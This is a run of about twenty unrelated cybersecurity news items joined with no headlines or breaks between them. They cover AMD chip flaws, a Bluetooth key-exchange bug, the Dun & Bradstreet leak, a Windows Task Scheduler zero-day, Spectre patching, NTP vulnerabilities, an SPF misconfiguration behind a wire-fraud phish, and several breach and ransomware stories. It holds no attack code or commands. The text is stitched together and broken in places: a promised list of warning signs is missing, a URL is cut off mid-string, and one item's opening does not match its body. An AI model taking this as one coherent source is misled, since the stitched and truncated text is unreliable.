The chipmaker says the patches will arrive within a few weeks and AMD device owners shouldn’t worry about the reported flaws.
AMD is addressing several vulnerabilities discovered in its Ryzen and EPYC chips, and rolling out updates for millions of devices ""in the coming weeks.""
The 13 vulnerabilities came to public attention clouded in controversy. The security company CTS Labs gave AMD less than 24 hours notice before releasing the information to the public. Standard vulnerability disclosure practices call for giving companies at least 90 days' notice so they can fix the flaws before researchers go public and hackers can start causing trouble.
Had CTS Labs given AMD that same courtesy, the issues would have been addressed within a week of the notification.
""Each of the issues cited can be mitigated through firmware patches and a standard BIOS update, which we plan to release in the coming weeks,"" said Sarah Youngbauer, AMD's senior spokeswoman. ""We believe this provides a good example of why the more standard 90-day notification window for such notifications exist."" 
In the original vulnerability report, CTS Labs said that it would take ""several months"" to fix the issues and that some hardware flaws ""cannot be fixed."" AMD disagreed with that timeline, and said it would provide more information in several weeks.
The chipmaker said the issues were not with its hardware, but with firmware, or software that's embedded in hardware. It'll be sending fixes for all 13 vulnerabilities through patches and BIOS updates.
According to AMD's technical assessment, each of the flaws required administrative access.
""Any attacker gaining unauthorized administrative access would have a wide range of attacks at their disposal well beyond the exploits identified in this research,"" Papermaster said in a statement.
Critics also took issue with another aspect of the CTS Labs report, pointing out the legal disclaimer on the company's website: ""You are advised that we may have, either directly or indirectly, an economic interest in the performance of the securities of the companies whose products are the subject of our reports.""  
Last Wednesday, CTS Labs' chief financial officer and co-founder, Yaron Luk-Zilberman, a former hedge fund manager, said it didn't have ""any investment (long or short) in Intel or AMD.""

With a bunch of security fixes released and more on the way, details have been made public of a Bluetooth bug that potentially allows miscreants to commandeer nearby devices.
This Carnegie-Mellon CERT vulnerability advisory on Monday laid out the cryptographic flaw: firmware or operating system drivers skip a vital check during a Diffie-Hellman key exchange between devices.
The impact: a nearby eavesdropper could “intercept and decrypt and/or forge and inject device messages” carried over Bluetooth Low Energy and Bluetooth Basic Rate/Enhanced Data Rate (BR/EDR) wireless connections between gizmos.
In other words, you can potentially snoop on supposedly encrypted communications between two devices to steal their info going over the air, and inject malicious commands. To pull this off, you must have been within radio range and transmitting while the gadgets were initially pairing.
The bug's status in Android is confusing: while it doesn't appear in the operating system project's July monthly bulletin, phone and tablet manufacturers like LG and Huawei list the bug as being patched in the, er, July security update. Microsoft has declared itself in the clear.
The CERT note says fixes are needed both in software and firmware, which should be obtained from manufacturers and developers, and installed – if at all possible. We're guessing for random small-time Bluetooth gizmos, it won't be very easy to prise an update out of the vendors, although you should have better luck with bigger brand gear.
So, make sure you're patched via the usual software update mechanisms, or just look out for nearby snoops, and be ready to thwart them, when pairing devices. Manufacturers were warned in January, it appears, so have had plenty of time to work on solutions.
Indeed, silicon vendor patches for CVE-2018-5383 are already rolling out among larger gadget and device makers, with Lenovo and Dell posting updates in the past month or so.
Linux versions prior to 3.19 don't support Bluetooth LE Secure Connections and are therefore not vulnerable, we're told.

About 33 million records belonging to Dun & Bradstreet have been leaked, placing a large portion of the US corporate population at risk.
According to independent researcher Troy Hunt, the database is about 52 gigabytes in size and contains just under 33.7 million unique email addresses and other contact information from employees of thousands of large enterprises and government entities.
While details are unfolding, the leak is thought to be from a database D&B acquired from NetProspex in 2015. The file is a “list rental” file that D&B offers marketers for use for their own email campaigns. It’s believed that one of these marketing firms is the source of the leak itself having been compromised in some way.
""We've carefully evaluated the information that was shared with us and it is of a type and in a format that we deliver to customers every day,” D&B said in a media statement.
“Dun & Bradstreet maintains that neither they or NetProspex suffered a breach or caused the leak,” said Stephen Boyer, co-founder and CTO of third-party risk management and security ratings firm BitSight. “If true and the leak stemmed from one of their customers, which represents a new dimension of third-party risk. While customers don't have ongoing relationships in the way that vendors and suppliers do, they still can pose risk when licensing and buying data in bulk.”
As originally reported by ZDNet, Hunt said in a blog post that he was able to determine that the most records in the database come from the US Department of Defense, with other government and large enterprises following.
The worrisome part is the deep bench of information that the records contain. For Wells Fargo, for example, the information is for the C-suite and 45 vice presidents, senior vice presidents, assistant vice presidents and executive vice presidents, all with names and email addresses alongside job titles.
""The market for stolen personal identifiable information continues to be lucrative for attackers to steal and sell data,” said Lee Weiner, chief product officer at Rapid7, via email. “Individuals affected by this breach should continue to be vigilant for piggy-back attacks that can ensue from attackers using this information to engage in phishing tactics with this information to steal passwords and gain access to accounts.""
Those follow-on threats can include business email compromise (BEC).
“This leak allows cyber-criminals to carry out whaling attacks for large enterprises,” said Boyer. “Some organizations have over 100,000 employee records compromised in this breach and may witness an uptake in targeted phishing attacks and fraud schemes.”
Hunt noted that the leak is an example of an endemic problem in data management and society.
“We've lost control of our personal data and…we often do not have any way of feeding back to companies what data we’d rather not share,” he noted. “Particularly when D&B believe they're operating legally by selling this information, what chance do we have—either as individuals or corporations—of regaining control of data like this? Next to zero and about the only thing you can do right now is assess whether you've been exposed.”

Due to the far reaching implications, Security Researchers will typically submit serious 0-day Windows exploits to Microsoft and give the company ample time to patch the vulnerabilities before they can be used to create malware and do harm. A security researcher that goes by the Twitter handle SandboxEscaper, however, decided it would be a good idea to expose a 0-day threat to the world on Twitter, without forewarning Microsoft, and even linked to proof on concept code on GitHub that has since been verified as functional.
The language in the original Tweet prevents me from directly embedding it here. SandboxEscaper essentially said, “Here is the alpc bug as 0day ... I don't ****ing care about life anymore. Neither do I ever again want to submit to MSFT anyway...”
The official post on the CERT/CC website explains, “The Microsoft Windows task scheduler SchRpcSetSecurity API contains a vulnerability in the handling of ALPC, which can allow a local user to gain SYSTEM privileges. We have confirmed that the public exploit code works on 64-bit Windows 10 and Windows Server 2016 systems. We have also confirmed compatibility with 32-bit Windows 10 with minor modifications to the public exploit code. Compatibility with other Windows versions is possible with further modifications.”

At this point, Microsoft does not have a patch at the ready, but according to reports a fix will be coming in the next batch of patch Tuesday updates. Because the exploit requires the local execution of code, it doesn’t necessarily warrant an out-of-band update. However, with proof of concept code readily available, it’s possible nefarious individuals could trick less savvy users into running the code and gain full access to their systems. As always, never execute any files from unknown or untrusted sources.The bug lies in the Windows Task Scheduler’s Advanced Local Procedure Call, or ALPC, interface. It allows a local user to gain system level privileges and have free reign over the system to do whatever they want, including overwriting / modifying system files. Will Dormann of CERT/CC verified the original exploit code works on a fully patched Windows 10 x64 installation and later modified the code to work on 32-bit systems as well.

Intel revealed that it will not be issuing Spectre patches to a number of older Intel processor families, potentially leaving many customers vulnerable to the security exploit. Intel claims the processors affected are mostly implemented as closed systems, so they aren’t at risk from the Spectre exploit, and that the age of these processors means they have limited commercial availability.
The processors which Intel won’t be patching include four lines from 2007, Penryn, Yorkfield, and Wolfdale, along with Bloomfield (2009), Clarksfield (2009), Jasper Forest (2010) and the Intel Atom SoFIA processors from 2015. According to Tom’s Hardware, Intel’s decision not to patch these products could stem from the relative difficulty of patching the Spectre exploit on older systems.
“After a comprehensive investigation of the microarchitectures and microcode capabilities for these products, Intel has determined to not release microcode updates for these products,” Intel said.
Because of the nature of the Spectre exploit, patches for it need to be delivered as an operating system or BIOS update, and if Microsoft and motherboard OEMs aren’t going to distribute the patches, developing them isn’t much of a priority.
“However, the real reason Intel gave up on patching these systems seems to be that neither motherboard makers nor Microsoft may be willing to update systems sold a decade ago,” Tom’s Hardware reports.
It sounds bad, but as Intel pointed out, these are all relatively old processors — with the exception of the Intel Atom SoFIA processor, which came out in 2015 — and it’s unlikely they’re used in any high-security environments. The Spectre exploit is a serious security vulnerability to be sure, but as some commentators have pointed out in recent months, it’s not the kind of exploit the average user needs to worry about.
“We’ve now completed release of microcode updates for Intel microprocessor products launched in the last 9+ years that required protection against the side-channel vulnerabilities discovered by Google Project Zero,” said an Intel spokseperson. “However, as indicated in our latest microcode revision guidance, we will not be providing updated microcode for a select number of older platforms for several reasons, including limited ecosystem support and customer feedback.”
If you have an old Penryn processor toiling away in an office PC somewhere, you’re probably more at risk for a malware infection arising from a bad download than you are susceptible to something as technically sophisticated as the Spectre or Meltdown vulnerabilities.

Researchers at Germany-based security firm Cure53 have conducted a 32-day audit of the Network Time Protocol (NTP) and the NTPsec project and discovered more than a dozen vulnerabilities.
Experts identified a total of 16 security-related issues, including 8 weaknesses that only affect NTP and two that only impact NTPsec, which is meant to be a secure, hardened and improved implementation of NTP.
Cure53 has published separate reports focusing on the NTP and NTPsec problems.
The Network Time Foundation addressed the flaws earlier this month with the release of ntp-4.2.8p10.
Cure53 has classified one vulnerability as being critical.
CVE-2017-6460, which only affects NTP, has been described as a stack-based buffer overflow that can be triggered by a malicious server when a client requests the restriction list.
The flaw can be exploited to cause a crash and possibly to execute arbitrary code.
The security holes rated by Cure53 as high severity are CVE-2017-6463 and CVE-2017-6464, both of which can be exploited for DoS attacks.
It’s worth noting that while some of the vulnerabilities have been classified as critical and high severity by Cure53, NTP developers have only assigned medium, low and informational-level severity ratings to the discovered flaws.
Ntp-4.2.8p10 patches a total of 15 vulnerabilities and also includes just as many non-security fixes and improvements.
Of the 15 security holes resolved in the latest version, 14 were discovered by Cure53, which also noticed that a flaw initially patched in December 2014 was reintroduced in November 2016.
One of the vulnerabilities fixed in ntp-4.2.8p10 was reported by researchers at Cisco Talos.
Experts identified a DoS vulnerability affecting the origin timestamp check functionality.

On March 25, security researcher Kevin Beaumont discovered something very unfortunate on Docs.com, Microsoft's free document-sharing site tied to the company's Office 365 service: its homepage had a search bar.
That in itself would not have been a problem if Office 2016 and Office 365 users were aware that the documents they were posting were being shared publicly.
As described in a Microsoft support document, ""with Docs.com, you can create an online portfolio of your expertise, discover, download, or bookmark works from other authors, and build your brand with built-in SEO, analytics, and email and social sharing.""
But many users used Docs.com to either share documents within their organizations or to pass them to people outside their organizations—unaware that the data was being indexed by search engines.
And many of the documents are still discoverable on the Google or Bing search engines, as they had been publicly indexed.
That means that until the documents are unpublished from Docs.com, they will continue to be accessible to anyone who searches against the site.
Microsoft had previously published a notice on security fixes to Docs.com for Office 365 administrators, advising them on how to control access by users to the service.
""Because Docs.com does not yet meet all of Office 365 compliance framework requirements, Office 365 and Azure Tenant administrators must 'opt-in' to enable users with organizational accounts to use the service,"" the Microsoft Support document states.
It's not clear how recently that change was made; Ars has reached out to Microsoft for further comment.
Update 10:30 AM ET: This morning, Microsoft disabled some searched on Docs.com, and is blocking some incoming links to searches from Google.
But additional documents were discoverable via Google search, including documents with health benefits information filled in.

Hong Kong might just have experienced its biggest ever data breach after the personal details of the Special Administrative Region (SAR)’s 3.7 million voters were stolen on two laptops.
The details are said to have included ID card numbers, addresses and mobile phone numbers.
They were stored on two laptops in a locked room at the AsiaWorld-Expo conference center near the airport.
The center is said to be the “back-up venue” for the region’s chief executive elections, which took place over the weekend.
The Registration and Electoral Office has reported the theft to police and told the South China Morning Post that the details of voters were encrypted – although it’s unclear how strong that encryption is.
It’s also unclear why the details of 3.7m voters were stored on the laptops when only an Election Committee of 1194 specially chosen business and political leaders is allowed to pick Hong Kong’s CEO.
The SAR’s privacy watchdog said in a statement that it is launching an investigation into the matter.
Over a three-year period from 2013 to 2016, the privacy commissioner’s office is said to have received 253 data breach notifications.
Eduard Meelhuysen, EMEA boss at Bitglass, argued that public sector breaches stand out as particularly concerning.
""Whether it’s the NHS or the Hong Kong Registration and Electoral Office, these organizations need to remember their duty of care, not to mention legal obligations, to protect citizens' and employees' data,” he said.
“This means not only keeping sensitive data encrypted, but also controlling where it goes using tools like access control and data leakage prevention.
Is it really a business necessity to store the information of millions of citizens on a laptop?""
In a separate incident, a laptop was stolen from Queen Mary Hospital last year, containing the personal details of nearly 4000 patients.

Juniper Networks has released its first cluster of security updates for 2019, with the patches addressing vulnerabilities in various products developed by the US networking equipment firm.
Among the 19 security advisories released on Wednesday is a critical bug impacting Junos OS, the FreeBSD-based operating system used in Juniper’s routers.
CVE-2019-0006 affects Junos OS versions 14.1X53, 15.1, 15.1X53, where it was found that a specially crafted HTTP packet could crash the fxpc daemon or could potentially lead to remote code execution (RCE).
Also marked as critical is CVE-2019-0007, which addresses a vulnerability in vMX series virtual routers running Junos OS 15.1.
“The vMX series software uses a predictable IP ID Sequence Number,” said Juniper. “This leaves the system as well as clients connecting through the device susceptible to a family of attacks.”
Patches have also been released for eight vulnerabilities in the libxml2 software library that impact Junos OS.
Eight additional security updates have been released by Juniper that feature mitigations for high-level impact bugs, while a further six deal with less severe flaws.
Multiple vulnerabilities were also discovered in Juniper’s Advanced Threat Prevention (ATP) cloud security service.
And finally, Juniper said nearly 40 vulnerabilities have been resolved in the Junos Space Network Management Platform 18.3R1 and 18.4R1 by upgrading third party components or fixing internally discovered security vulnerabilities.
Commenting on the advisories, the National Cybersecurity and Communications Integration Center (NCCIC), said: “Users and administrators should review Juniper’s Security Advisories webpage and apply the necessary updates.”

I recently had a client get an interesting phishing message.
They had received a fake message from their CEO to their Controller - a ""start the conversation"" email to end up with a wire transfer.
This sort of email is not common, but is frequent enough in Sr Management circles, especially if you are in the middle of merger or acquisition discussions with another company.
Some technical warning signs in that note were:
So the discussion quickly moved from ""I'm glad our execs came to us, we really dodged a bullet there"" to ""just how did this get in the door past our spam filter anyway?""
Their SPAM filter does use the SPF (Sender Policy Framework) DNS TXT record, and a quick check on the SPF indicated that things looked in order there.
However, after a second look, the problem jumped right out.
A properly formed SPF will end with a ""-"", which essentially means ""mail senders in this SPF record are valid for this domain, and no others"".
However, their SPF had a typo - their record ended in a ""~"" instead.
What the tilde character means to this spam filter is ""the mail senders in this SPF record are valid for this domain, but YOLO, so is any other mail sender"".
From the RFC (RFC7208), the ~ means ""softfail"", ""A ""softfail"" result is a weak statement by the publishing ADMD that the host is probably not authorized"".
More detail appears later in the RFC:
""A ""softfail"" result ought to be treated as somewhere between ""fail"" and ""neutral""/""none"".
The ADMD believes the host is not authorized but is not willing to make a strong policy statement.
Receiving software SHOULD NOT reject the message based solely on this result, but MAY subject the message to closer scrutiny than normal.
""  This same reasoning applies to the ~all and -all directives in the SPF (which I see more often).
You'd think that a lot has changed since 2006 (the date of the original SPF spec, RFC4408), that in 2017 a spam filter should fail on that result, but apparently not (sad panda).
Kinda makes you wonder what the actual use case is for that tilde character in the definition - I can't think of a good reason to list permitted mail senders, then allow any and every other server too.
That being said, their filter *should* still have caught the mismatch between the ""from"" and ""reply-to"" fields, especially since it involved an external source and internal domains.
Or at least paired that up with the domain mismatch to weight this email towards a SPAM decision.
Long story short - this type of attack was pretty popular (and widely reported) about a year ago, but successful methods never (never ever) go away.
A little bit of research can make for a really well-formed phish, right down to using the right people in the conversation, good grammar, and phrasing appropriate to the people involved.
So a bit of homework can get an attacker a really nice payday, especially if their campaign targets a few hundred companies at a time (and they put more work into their email than the example above)
So in this case, a typo in a DNS record could have cost millions of dollars.
Good security training for the end users and vigilant people made all the difference - a phone call to confirm is a ""must-do"" step before doing something irrevocable like a wire transfer.

The recent political furor over state sponsored hacking took an ugly and dangerous turn, on the morning of December 30th when a tiny Vermont electric utility reported that Grizzly Steppe – the spear-fishing process used to access DNC emails – had been found on one of their systems.
Vermont Governor, Peter Shumlin issued a statement accusing Vladimir Putin of attempting to hack Vermont’s electrical grid, and many others follow suit.
And there appears to be a good chance that the malicious code found on a Burlington Electric laptop is evidence of a state sponsored cyberattack.
Following the initial news cycle, some pundits dismissed the finding as a non-story.
It’s true, the laptop was “not connected to the power grid systems”, and there is no proof yet that the Russians were involved.
It’s also true that the Russian built Grizzly Steppe hacking code is widely available on the dark internet, and anyone could have put it on that laptop.
According to Ukrainian energy provider Ukrenergo, a second major outage on December 17, 2016, may have been caused by a similar cyber-attack.
Attacks on critical infrastructure typically require a long, slow, low-profile campaign, beginning with subtle, difficult to detect maneuvers, like slipping malware on laptop computers.
Two years prior to the first Ukraine incident, hackers began attempting to acquire legitimate login credentials by hacking non-operational systems at Ukrainian utilities – systems very much like Burlington Electric’s laptop.
According to a Booz Allen analysis, spear-phishing emails containing weaponized Microsoft Word, Excel, and PowerPoint files, exactly the type of files typically found on laptop computers, were sent to Ukraine electric utility employees as early as May 2014.
Once legitimate login credentials were discovered through these seemingly minor attacks on non-operational systems, the hackers used them to access critical Industrial Control Systems (ICS) in order to shutoff breakers, shutdown uninterrupted power supplies (UPS), destroy Human Machine Interface (HMI) systems, and destroy Serial-to-Ethernet devices at substations.

Popular travel-booking site Orbitz has likely been hacked, potentially exposing payment card information for people that bought plane tickets or booked hotel rooms over the course of two years.
The company said that it has uncovered evidence that about 880,000 payment cards were possibly impacted, along with other personal information, like names, payment card information, dates of birth, phone numbers, email addresses, physical and/or billing addresses and gender.
The company said evidence suggests an attacker may have accessed information stored on a legacy e-commerce platform during two periods: 1 January through 22 June 2016 and 1 October to 22 December 2017.
""We determined on March 1, 2018, that there was evidence suggesting that an attacker may have accessed personal information stored on this consumer and business partner platform,” the Expedia-owned site said in a media statement. “We took immediate steps to investigate the incident and enhance security and monitoring of the affected platform. To date, we do not have direct evidence that this personal information was actually taken from the platform. We deeply regret the incident, and we are committed to doing everything we can to maintain the trust of our customers and partners.""
Mike Schuricht, vice president of product management at Bitglass, said that the issue may have arisen as an artifact of the acquisition integration. Expedia bought the company in September 2015.
“Any organization that is acquired by or is acquiring another business and its IT assets typically has a major blind spot with respect to its legacy or nonproduction systems,” Schuricht said via email. “As is the case with most audits and postmortems in the event of a breach, Expedia is likely looking back at the infrastructure affiliated with its prior acquisitions, like Travelocity, to ensure all of its owned databases are not similarly impacted. It’s always a concern when an organization only becomes aware of a breach months or years after it takes place – highlighting the inadequacy of reactive security solutions and auditing processes.”
Orbitz is offering customers a year of free credit monitoring; yet Nathan Wenzler, chief security strategist at San Francisco-based security consulting company AsTech, said that more is needed.
“Another day, another breach. And while the attackers show no signs of slowing down, companies really need to do more than just provide users a free year of credit monitoring services and consider their work done,” he said via email. “Legacy systems are common attack points, as they are often neglected, go without updates or patches and are commonly not monitored, which gives criminals an ideal avenue to gain access and steal whatever data may be resident there. In this case, it was nearly 900,000 credit card accounts. Credit monitoring may be a nice PR gesture, but it does not absolve companies from doing their due diligence around securing legacy systems and protecting their customers data, no matter where it lives.”

Officials in Madison County say a ransomware attack has left the county struggling to conduct business.
 County Commissioner Brent Mendenhall tells the Post Register in a story on Wednesday county employees have been unable to send emails since Sunday.
 Madison County Clerk Kim Muir says the county is using backup data from Saturday to issue paychecks Thursday.
 The objective of ransomware is to cut off a user's access to computer systems and then demand payment to return that access.
 Mendenhall and Muir say they have no intention of paying the ransom and haven't looked to see how much is being demanded.
 Mendenhall credited county workers for backing up data, meaning the system can be restored without paying the ransom.

Hackers that tried to extort money from Disney by threatening to make public an upcoming movie ahead of its release date appear to have been bluffing, the firm’s boss has revealed.
Chairman and CEO Bob Iger said the media giant had, to its knowledge, not been hacked.
“We had a threat of a hack of a movie being stolen. We decided to take it seriously but not react in the manner in which the person who was threatening us had required,” he told Yahoo Finance.
“We don’t believe that it was real and nothing has happened.”
The hackers apparently demanded a large payment in Bitcoin, and threatened to release five minutes of the stolen film followed by subsequent 20-minute instalments if their demands weren’t met.
Disney likely took the threat seriously given that a similar incident occurred last month when a hacker uploaded the upcoming series of Netflix prison drama Orange is the New Black to The Pirate Bay after the streaming giant refused to pay a ransom.
In that case, a third-party production vendor used by the studios was to blame, after its security was compromised by the hacker.
Iger acknowledged the elevation of cybersecurity to a “front burner issue.”
“Technology is an enabler to run our businesses more securely, whether that’s protecting our intellectual property or protecting our guests or employees around the world,” he argued.
Unfortunately, many boardrooms don’t share Iger’s enthusiasm for cybersecurity-related issues.
Just 5% of FTSE 100 companies claim to have a technology expert on the board, despite most of them (87%) identifying cybersecurity as a major risk to the firm, according to a recent Deloitte report.
Yet cybersecurity is something the C-level need to get urgently up to speed with, as increasing numbers are targeted by whalers.
Just this month, Barclays CEO Jes Staley was tricked into emailing someone pretending to be the bank’s chairman, John McFarlane.

Microsoft has released an emergency security update to patch below-reported crazy bad remote code execution vulnerability in its Microsoft Malware Protection Engine (MMPE) that affects Windows 7, 8.1, RT and 10 computers, as well as Windows Server 2016 operating systems.
Google Project Zero's security researchers have discovered another critical remote code execution (RCE) vulnerability in Microsoft’s Windows operating system, claiming that it is something truly bad.
Tavis Ormandy announced during the weekend that he and another Project Zero researcher Natalie Silvanovich discovered ""the worst Windows remote code [execution vulnerability] in recent memory. This is crazy bad. Report on the way.""
Ormandy did not provide any further details of the Windows RCE bug, as Google gives a 90-day security disclosure deadline to all software vendors to patch their products and disclose it to the public.
This means the details of the new RCE vulnerability in Windows will likely be disclosed in 90 days from now even if Microsoft fails to patch the issue.
However, Ormandy later revealed some details of the Windows RCE flaw, clarifying that:

The vulnerability they claimed to have discovered works against default Windows installations.
The attacker does not need to be on the same local area network (LAN) as the victim, which means vulnerable Windows computers can be hacked remotely.
The attack is ""wormable,"" capability to spread itself.

Despite not even releasing any technical details on the RCE flaw, some IT professionals working for corporates have criticized the Google Project Zero researcher for making the existence of the vulnerability public, while Twitter's infosec community is happy with the work.
""If a tweet is causing panic or confusion in your organization, the problem isn't the tweet, the problem is your organization,"" Project Zero researcher Natalie Silvanovich tweeted.
This is not the first time when Google's security researchers have discovered flaws in Microsoft’s products. Most recently in February, Google researchers disclosed the details of an unpatched vulnerability impacting Microsoft's Edge and Internet Explorer browsers.
Microsoft released a patch as part of its next Patch Tuesday but criticized Google for making all details public, exposing millions of its Windows users at risk of being hacked.
Microsoft has not yet responded to the latest claims, but the company has its May 2017 Patch Tuesday scheduled tomorrow, May 9, so hopefully, it will include a security patch to resolve this issue.

The Internal Revenue Service (IRS) has said that personal data of nearly 100,000 taxpayers may have been compromised by a breach of its tool to apply for student financial aid, The Chronicle of Higher Education reports.
The Free Application for Federal Student Aid (FAFSA) tool was taken offline in March after discovery of suspicious activity, and will be operational only in October.
In a statement to the Senate Finance Committee, IRS chief John Koskinen said 35,000 affected people had been notified of the breach and $30 million been paid for around 8,000 fraudulent tax refunds.
The IRS has come under fire for cutting off the tool and Senator Lamar Alexander of Tennessee, urged authorities to “continue to prioritize getting the helpful data-retrieval tool back online quickly with adequate protection for users’ data”.
The agency admits being made aware in September last year that FAFSA could be misused by hackers.
“To shut it down without a clear indication of criminals actually using it seemed to us that it was going to unnecessarily disadvantage millions of people who used it,” Koskinen clarified, says The Wall Street Journal.

As everyone in TV-land knows, established broadcasters have been losing eyeballs to streaming companies such as Netflix and Amazon and their big-budget “event” shows.
The upstarts look unstoppable but might an obscure hacker called The Dark Overlord, previously connected to health sector data extortion, have spotted an important flaw in the model?
Last week, Netflix found itself on the receiving end of a ransom demand from the individual or group, making unconfirmed demands in return for not releasing the unseen series 5 of the hit Orange Is the New Black, starring Dascha Polanco (pictured, at Toronto Pride) to the web.
The company, understandably, refused to play ball and on Saturday reports emerged that a number of episodes had appeared on a popular torrenting service, the name of which it behoves us not to mention for reasons including the high risk of encountering malware.
Visiting that resource, we managed to find one file with mention of a “press release” that has since been expunged, including from web caches. It reportedly read:
We’ve decided to release Episodes 2-10 of “Orange Is The New Black” Season 5 after many lengthy discussions at the office where alcohol was present.
Separately, the group’s Twitter feed crowed:
And so let it be read that the loathsome giants do too fall. Hello Netflix, we’ve arrived.
The account threatened the release of material stolen from other media companies, including ABC, National Geographic and Fox.
Netflix acknowledged the leak, which it said was caused by a breach at a “production vendor” also used by other TV studios. Netflix is cleverly covering its back by pointing the level of integration – and vulnerability – in the TV industry, but there is no question the breach still lands at its door.
It’s not clear whether the way streaming services process digital content is that different or less secure from established broadcasters but the minute a show exists in a form that can be copied it becomes vulnerable to theft.
The BBC found this out to its cost when an episode of the Russian version of Sherlock found its way on to the internet before it was due to be broadcast.
And yet, defying cybersecurity breach orthodoxy, perhaps this particular breach isn’t so bad after all: on Monday, Netflix’s share price even rose.
One reason might be that content breaches aren’t the same as ones involving customer data. The latter will cost the victim organisation money, court time and, in most countries, regulatory investigation.
A few people watching a Netflix show earlier than normal seems minor by comparison as long as it doesn’t happen too often. Assuming the company patches the hole that let its show be thieved, it’s not stretching it to suggest The Dark Overlord’s leaking could even have given Orange Is the New Black an unintended publicity jump.
Presumably that’s not what The Dark Overlord intended although it’s also possible this has always been about self-regarding publicity as much as simple extortion for money. If so, Netflix is starting to look like the winner on that front too.

China’s largest Internet security company, Qihoo 360, has found several high-risk security vulnerabilities in EOS’s blockchain platform. These vulnerabilities would enable remote attacks on all EOS nodes, Qihoo 360 claimed on Weibo Tuesday, May 29.
Qihoo 360 writes that they reported the vulnerability to the EOS team and that the EOS mainnet will not launch until the security problems are resolved. Local news outlet Jinse, which noted that EOS asked 360 not to report the vulnerability, claimed that the vulnerabilities have been fixed on the same day, by around 2:00 pm China Standard Time.
According to 360’s Weibo post, the vulnerability would allow an attacker to use a smart contract with malicious code to open a security hole, and then use the supernode to enter the malicious smart contract into a new block, thus putting all network nodes under the attacker’s control.
Once this action has been completed, the attacker could then control the digital currency on the EOS network, obtain user’s private keys and data, launch a cyber attack, or begin mining for other cryptocurrencies.
360 describes these vulnerabilities as a new “series of unprecedented security risks” that could affect other blockchain platforms besides EOS:
    “360 expressed [hope]  that the discovery and disclosure of this loophole will cause the blockchain industry and security peers to pay more attention to the security of such issues and jointly enhance the security of the blockchain network.”
EOS, whose mainnet is scheduled to launch on June 2, is currently down by 2.76 percent over a 24 hour period, trading at around $11.70 by press time, according to Coinmarketcap data.

A critical vulnerability in open source automation tool Jenkins could allow permission checks to be bypassed through the use of specially-crafted URLs.
Jenkins uses the Stapler web framework for HTTP request handling, which uses reflection to dispatch incoming web requests to controller code.
This means that any public methods that start with get and include string and integer parameters are exposed to the web server.
Because this is a common naming convention, this has led to multiple internal Jenkins methods being inadvertently exposed.
The precise impact of this isn’t clear. The advisory notes that code execution could be a possible outcome – though on closer inspection, this seems to be a worst-case scenario.
“To clarify, the vulnerability we addressed had nothing to do with arbitrary code execution, but was rather an issue discovered by the Jenkins security team that allowed a small subset of existing Jenkins code to be invoked by a remote client,” Daniel Beck, Jenkins security officer, told The Daily Swig in an email.
“While the known impact is pretty limited, we felt that the layer at which the vulnerability existed, and its potential warranted a higher score.”
These potential attacks include unauthenticated users being able to invalidate sessions when running with the built-in server, and users with overall/read permissions being able to create new user objects in memory.
The advisory reads: “Given the vast potential attack surface, we fully expect other attacks, that we are not currently aware of, to be possible on Jenkins releases that do not have this fix applied.
“This is reflected in the high score we assigned to this issue, rather than limiting the score to the impact through known issues.”
Beck added: “Jenkins users should always keep their instances up to date. In this case, we released updates for two LTS lines simultaneously for the first time, so admins could apply the update without having to go through a major version jump.
“We strive to fix all security vulnerabilities in Jenkins and plugins in a timely manner.”
Reflection is also used by Apache Struts, via the OGNL library.
Struts has suffered a number of serious security flaws in recent years. In 2017, a vulnerability in the framework was exploited to expose the details of up to 148 million Equifax customers.
Another flaw, revealed in August 2018, could lead to remote code execution.
These issues underline the dangers of using reflection with untrusted data, and application architects would do well to avoid this unsafe practice.

The Indiana Department of Revenue (DOR) and the Internal Revenue Service (IRS) are warning folks of fraudulent emails impersonating either revenue agency and encouraging individuals to open files corrupted with malware.
These scam emails use tax transcripts as bait to entice users to open the attachments.
The scam is particularly problematic for businesses or government agencies whose employees open the malware infected attachments, putting the entire network at risk. This software is complex and may take several months to remove.
This well-known malware, known as Emotet, generally poses as specific banks or financial institutions to trick individuals into opening infected documents. It has been described as one of the most costly and destructive malware to date. Emotet is known to constantly evolve, and in the past few weeks has masqueraded as the IRS, pretending to be “IRS Online.” The scam email includes an attachment labeled “Tax Account Transcript” or something similar, with the subject line often including “tax transcript.”
Both DOR and IRS have several tips to help individuals and businesses not fall prey to email scams:
 Remember, DOR and the IRS do not contact customers via email to share sensitive documents such as a tax transcript.
 Use security software to protect against malware and viruses, and be sure it’s up-to-date.
 Never open emails, attachments or click on links when you’re not sure of the source.
 If an individual is using a personal computer and receives an email claiming to be the IRS, it is recommended to delete or forward the email to phishing@irs.gov orto investigations@dor.in.gov
 Business receiving these emails should also be sure to contact the company’s technology professionals.

Netskope Threat Research Labs has observed phishing attacks using decoy PDF files, URL redirection, and Cloud Storage services to infect users and propagate malware.
Because many organizations have default “allow” security policies for popular Cloud Storage services and PDF readers to let users take advantage of these useful services, these attacks pass through the corporate network to end users’ machines undetected.
Moreover, as users collaborate and share through cloud services, these malicious files posing as PDFs “fan out” to shared users, creating a secondary propagation vector.
We are calling this the “CloudPhishing Fan-out Effect”.
In this blog, we will detail the insidious nature of CloudPhishing and the secondary fan-out using two recently detected cases.
We will also illustrate how an attack – even if unsuccessful – may leave the target vulnerable to future attacks.
Additionally, we will outline the Netskope protection stance, and general best practices to handle this attack.
The CloudPhishing fan-out effect occurs when a victim inadvertently shares the phishing document with colleagues, whether internal or external, via a cloud service.
This is particularly insidious in the cloud, as shared users lose the context of the document’s external origin and may trust the internally shared document as if it were created internally.
Other than having the file shared in OneDrive, the SaaS application is unrelated to the attack.
This threat, seen in one of our customer environments, is detected by Netskope Active Threat Protection as Backdoor.Phishing.FW.
The decoy PDF is usually delivered as an email attachment named,“invoice” in an attempt to lure the victim into executing the file.
This, in effect, weakens the security posture of the endpoint against future attacks.
The decoy PDF connects to the TinyURL link, http://TinyURL[.
The attacker used the TinyURL link as an evasive tactic to hide the original link.
At the time of analysis, the web page was down and not serving any content.
This might be because the web page was removed or renamed.
Our analysis showed that the Adobe Acrobat Reader prompts a security warning to the user when the document connects to a link.
This feature allows any URL related to the domain that is on the allowed list.
Based on the behavior seen in the latest version of the Adobe Acrobat Reader, we recommend users un-check the “Remember this action…” option while allowing the PDF to connect to an external link.
We also advise users to hover their mouse over the hyperlink to confirm the link and also regularly monitor managed Internet access settings in the PDF reader’s Trust Manager.
The phishing PDF decoys showcase the use of URL redirectors and cloud services, and also a secondary propagation vector within the shared users leading to the CloudPhishing fan-out.
By taking advantage of the “default allow” action in popular PDF readers, the attacker can easily deploy multiple attacks without getting the security warning after the first alert.
This makes the attacker effectively a host for phishing pages or malicious payloads using URL redirection services and Cloud Storage services.

